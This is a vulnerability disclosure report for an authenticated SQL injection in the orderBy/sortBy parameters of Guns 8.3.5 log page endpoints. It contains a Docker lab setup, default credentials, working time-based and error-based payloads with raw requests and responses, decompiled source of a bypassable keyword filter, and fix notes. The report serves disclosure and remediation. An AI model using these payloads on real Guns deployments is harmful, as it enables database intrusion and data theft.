### Vulnerability details

**Official website / Product:** https://www.javaguns.com/ / https://github.com/stylefeng/Guns

**Repository:** stylefeng/Guns (stars at selection: 3972)

**Vulnerability type:** SQLi

**Vulnerable versions:** Guns 8.3.5 (roses `kernel-a-rule` / `log-business-login-log` / `log-business-*` 8.3.5; commit `2a12947733945d5c06197d99ecaa77d7f2b0aeba`)

**Vulnerability URL / Parameter:** `GET /loginLog/page` query parameters `orderBy`, `sortBy` (same `BaseRequest.getOrderByLastSql()` helper also used by `GET /logManager/page`, `GET /sysLogBusiness/page`)

**Complex:** yes

### Verification procedure

1. **Lab** (original `labs/guns-r59-a5/` and images `guns-r59-a5-app:latest` / `mysql:8.0` were cleaned; rebuild with the self-contained steps below):
   - Check out stylefeng/Guns **8.3.5** (`2a12947733945d5c06197d99ecaa77d7f2b0aeba`) and package `guns.jar` (this campaign tree already has `repos/Guns/target/guns.jar`; Manifest: Spring Boot 3.2.10 / Build-Jdk-Spec 17 / `spring.profiles.active=local`).
   - Create a lab directory, drop in the `Dockerfile` and `docker-compose.yml` below, copy `guns.jar` beside them, then `docker compose up -d --build`. Host port **23905→8080**; containers `guns-r59-a5-app` / `guns-r59-a5-db`. Stack: Spring Boot 3.2.10 + MySQL 8.0 + roses 8.3.5. The app initializes schema via Flyway `classpath:db/migration/mysql`.
   - Default admin: `admin` / `123456`. `SYS_AUTH_PASSWORD_RSA_VALIDATE` defaults to **false**, so plaintext password works; if RSA transfer encryption is enabled, encrypt with `guns.password.rsa.public-key` from `application.yml` before posting.

Lab `Dockerfile`:

```dockerfile
FROM eclipse-temurin:17-jre
WORKDIR /app
COPY guns.jar /app/guns.jar
EXPOSE 8080
ENTRYPOINT ["java","-jar","/app/guns.jar"]
```

Lab `docker-compose.yml`:

```yaml
services:
  db:
    image: mysql:8.0
    container_name: guns-r59-a5-db
    environment:
      MYSQL_ROOT_PASSWORD: "123456"
      MYSQL_DATABASE: guns
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-uroot", "-p123456"]
      interval: 5s
      timeout: 5s
      retries: 30

  app:
    build: .
    image: guns-r59-a5-app:latest
    container_name: guns-r59-a5-app
    ports:
      - "23905:8080"
    environment:
      SPRING_DATASOURCE_URL: jdbc:mysql://db:3306/guns?autoReconnect=true&useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=CONVERT_TO_NULL&useSSL=false&nullCatalogMeansCurrent=true&allowPublicKeyRetrieval=true
      SPRING_DATASOURCE_USERNAME: root
      SPRING_DATASOURCE_PASSWORD: "123456"
    depends_on:
      db:
        condition: service_healthy
```

```bash
mkdir -p guns-r59-a5 && cd guns-r59-a5
# Write the Dockerfile / docker-compose.yml above, copy in guns.jar, then:
docker compose up -d --build
# Wait for Started in app logs; smoke check:
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:23905/
```

2. Log in and take the JWT from `data.token` (send it as the `Authorization` header; the PoC JWT is a lab-captured value — replace with a fresh login token when reproducing):

```http
POST /loginApi HTTP/1.1
Host: 127.0.0.1:23905
Content-Type: application/json
Accept: application/json
Connection: close

{"account":"admin","password":"123456","rememberMe":false}
```

Success looks like: `{"success":true,"code":"00000",...,"data":{"userId":"1339550467939639299","token":"eyJhbGciOiJIUzUxMiJ9..."}}`. The page endpoint requires `LOG_LOGIN` (default admin has it).

3. Baseline: `GET /loginLog/page?pageNo=1&pageSize=10&orderBy=create_time&sortBy=desc` returns HTTP 200 in ~0.01–0.02s.
4. Time-based: `orderBy=(SELECT SLEEP(5))&sortBy=asc` took **5.027644s** versus baseline **0.014548s**.
5. Error-based: `orderBy=extractvalue(1,concat(0x7e,version()))&sortBy=asc` returns HTTP 500; `exceptionTip` leaks `XPATH syntax error: '~8.0.46'` and shows the full SQL with injected `ORDER BY extractvalue(1, concat(0x7e, version())) ASC`.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
GET /loginLog/page?pageNo=1&pageSize=10&orderBy=extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29&sortBy=asc HTTP/1.0
Host: 127.0.0.1:23905
Authorization: eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySWQiOjEzMzk1NTA0Njc5Mzk2MzkyOTksImFjY291bnQiOiJhZG1pbiIsInV1aWQiOiIzYWM0MjE2ZC1lOTA4LTRlZGMtYjY3MS0xNmY5ZGFmZDJmYjEiLCJyZW1lbWJlck1lIjpmYWxzZSwiZXhwaXJhdGlvbkRhdGUiOjE3OTQyMzIyODMwNjUsImNhVG9rZW4iOm51bGwsIm90aGVycyI6bnVsbCwic3ViIjoiMTMzOTU1MDQ2NzkzOTYzOTI5OSIsImlhdCI6MTc5MzYyNzQ4MywiZXhwIjoxNzk0MjMyMjgzfQ.RthI17QU3dncD5rYvJzTDFgjz6KCL1O6WwQMGE64V8nDp3MR12IBcn_yU_BuWFS1-cax7rlTEAqdQ563nEyUoA
Accept: application/json
Connection: close

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Date: Mon, 02 Nov 2026 13:52:31 GMT
Connection: close

{
  "success": false,
  "code": "B0001",
  "message": "系统执行出错，请检查系统运行状况",
  "data": null,
  "exceptionClazz": "UncategorizedSQLException",
  "exceptionTip": "\n### Error querying database.  Cause: java.sql.SQLException: XPATH syntax error: '~8.0.46'\n### The error may exist in cn/stylefeng/roses/kernel/log/loginlog/mapper/SysLoginLogMapper.java (best guess)\n### The error may involve defaultParameterMap\n### The error occurred while setting parameters\n### SQL: SELECT llg_id, llg_name, llg_succeed, llg_message, llg_ip_address, user_id, account, create_time FROM sys_login_log ORDER BY extractvalue(1, concat(0x7e, version())) ASC LIMIT ?\n### Cause: java.sql.SQLException: XPATH syntax error: '~8.0.46'\n; uncategorized SQLException; SQL state [HY000]; error code [1105]; XPATH syntax error: '~8.0.46'",
  "exceptionPlace": "org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:93)"
}
```

Time-based proof (Docker-measured curl `time_total`):

```
==== TIME PROOF ====
Baseline orderBy=create_time:
time_total=0.014548
Payload orderBy=(SELECT SLEEP(5)):
time_total=5.027644
```

Second terminal check (same payloads):

```
[2] Baseline:
HTTP 200 time=0.011382s

[3] Time-based: orderBy=(SELECT SLEEP(5))
HTTP 200 time=5.012967s

[4] Error-based: orderBy=extractvalue(1,concat(0x7e,version()))
HTTP/1.1 500
Impact: MySQL version leaked as ~8.0.46; injected SQL visible in ORDER BY clause.
```

Verification result notes:

- Time-based: `orderBy=(SELECT SLEEP(5))` took 5.027644s versus baseline 0.014548s.
- Error-based: response leaks MySQL version `8.0.46` and shows the malicious expression concatenated into `ORDER BY`.
- Requires authentication with `LOG_LOGIN` permission (default admin has it). The same sink exists on API-log and business-log page endpoints.

### Vulnerability analysis

Guns/roses builds an ORDER BY fragment in `BaseRequest.getOrderByLastSql()` by concatenating attacker-controlled `orderBy`/`sortBy`, then appends it via MyBatis-Plus `QueryWrapper.last()`. The supposed guard `SqlInjectionDetector.hasSqlInjection()` compiles a short keyword denylist (ALTER/CREATE/DELETE/DROP/EXEC/INSERT/MERGE/SELECT/UPDATE) and uses `Matcher.matches()`, which only blocks strings that *entirely* match starting at a keyword. Payloads such as `(SELECT SLEEP(5))`, `extractvalue(...)`, `IF(...)`, and many `UNION` forms that do not start as a bare keyword therefore bypass the filter and execute inside ORDER BY.

The same helper is used by:

- `SysLogServiceImpl` → `/logManager/page`
- `SysLogBusinessServiceImpl` → `/sysLogBusiness/page`

### Trigger / sink source (full path and line numbers)

Line numbers from jadx decompilation of roses **8.3.5** jars inside `guns.jar` (`kernel-a-rule-8.3.5.jar` / `log-business-login-log-8.3.5.jar`).

```java
# File: com/javaguns/roses/kernel-a-rule/8.3.5 → cn/stylefeng/roses/kernel/rule/util/SqlInjectionDetector.java
# Lines: 8-17 (entire class)
private static final String SQL_KEYWORD_PATTERN = "\\b(ALTER|CREATE|DELETE|DROP|EXEC(UTE){0,1}|INSERT(\\s+INTO){0,1}|MERGE|SELECT|UPDATE)\\b.*";

public static boolean hasSqlInjection(String param) {
    if (param == null) {
        return false;
    }
    Pattern pattern = Pattern.compile(SQL_KEYWORD_PATTERN, Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
    Matcher matcher = pattern.matcher(param);
    return matcher.matches();
}
```

```java
# File: com/javaguns/roses/kernel-a-rule/8.3.5 → cn/stylefeng/roses/kernel/rule/pojo/request/BaseRequest.java
# Lines: 413-418 (jadx lines after Lombok expansion; equivalent logic)
public String getOrderByLastSql() {
    if (ObjectUtil.isEmpty(this.orderBy) || ObjectUtil.isEmpty(this.sortBy)
            || SqlInjectionDetector.hasSqlInjection(this.orderBy)
            || SqlInjectionDetector.hasSqlInjection(this.sortBy)) {
        return "";
    }
    return " order by " + this.orderBy + " " + this.sortBy + " ";
}
```

```java
# File: com/javaguns/roses/log-business-login-log/8.3.5 → cn/stylefeng/roses/kernel/log/loginlog/service/impl/SysLoginLogServiceImpl.java
# Lines: 169-175
if (ObjectUtil.isNotEmpty(sysLoginLogRequest.getOrderBy()) && ObjectUtil.isNotEmpty(sysLoginLogRequest.getSortBy())) {
    queryWrapper.last(sysLoginLogRequest.getOrderByLastSql());
} else {
    queryWrapper.orderByDesc(SysLoginLog::getCreateTime);
}
```

```java
# File: com/javaguns/roses/log-business-login-log/8.3.5 → cn/stylefeng/roses/kernel/log/loginlog/controller/SysLoginLogController.java
# Lines: 39-41
@GetResource(name = "分页查询登录日志", path = "/loginLog/page")
public ResponseData<PageResult<SysLoginLog>> page(SysLoginLogRequest sysLoginLogRequest) {
    return new SuccessResponseData<>(sysLoginLogService.findPage(sysLoginLogRequest));
}
```

### Fix notes

1. Do not concatenate user input into ORDER BY. Whitelist column identifiers (entity field map) and allow only `asc`/`desc` for direction.
2. Remove or rewrite `SqlInjectionDetector`; `matches()` plus an incomplete keyword denylist is not a control.
3. Stop returning full SQL / JDBC exception details to clients.
